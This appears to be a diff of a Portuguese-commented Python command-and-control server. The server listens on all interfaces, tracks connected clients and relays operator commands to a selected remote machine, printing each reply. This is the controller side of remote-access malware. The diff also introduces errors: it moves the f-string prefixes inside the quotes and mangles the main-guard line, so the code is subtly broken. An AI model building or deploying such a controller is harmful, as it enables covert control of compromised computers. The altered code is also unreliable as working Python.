@@ -6,7 +6,7 @@ conexoes =[]
 enderecos =[]
 
 def handle_client(conn,addr):
-  print(f"[+]Nova conexao de={addr}")
+  print ("f[+]Nova conexao de={addr}")
   conexoes.append(conn)
   enderecos.append(addr)
   try:
@@ -20,7 +20,7 @@ def handle_client(conn,addr):
     conn.close()
     conexoes.remove(conn)
     enderecos.remove(addr)
-    print(f"[-]Conexão encerrada:{addr}")
+    print("f[-]Conexão encerrada:{addr}")
 
 def main():
   host = "0.0.0.0"
@@ -28,7 +28,7 @@ def main():
   server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   server.bind((host,porta))
   server.listen(9)
-  print(f"[*]Serverdor C2 escutando em {host}:{porta}")
+  print ("f[*]Serverdor C2 escutando em {host}:{porta}")
 
   # Thread para aceitar conexões
   threading.Thread(target=aceitar_conexoes,args=(server,)).start()
@@ -55,25 +55,25 @@ def aceitar_conexoes(server):
 def listar_conexoes():
  print("\n[+]Conexões ativas:")
  for i,addr in enumerate(enderecos):
-   print(f"{i}:{addr}")
+   print("f{i}:{addr}")
 
 def interagir_conexao(idx):
    try:
     conn = conexoes[idx]
     addr = enderecos[idx]
-    print(f"\n[+] Interagindo com:{addr}")
+    print("f\n[+] Interagindo com:{addr}")
     while True:
-     comando=input(f"C2({addr}):")
+     comando=input("fC2({addr}):")
      if comando.lower()=="sair":
       break
      if comando:
        conn.send(comando.encode())
        resposta=conn.recv(1024).decode()
-     print(f"{addr}>{resposta}")
+     print("f{addr}>{resposta}")
    except IndexError:
      print("[-]Índice inválido.")
    except Exception as e:
-     print(f"[-]Erro ao interagir com a conexão:{str(e)}")
+     print("f[-]Erro ao interagir com a conexão:{str(e)}")
 
 if __name__:'_main_'
 main()
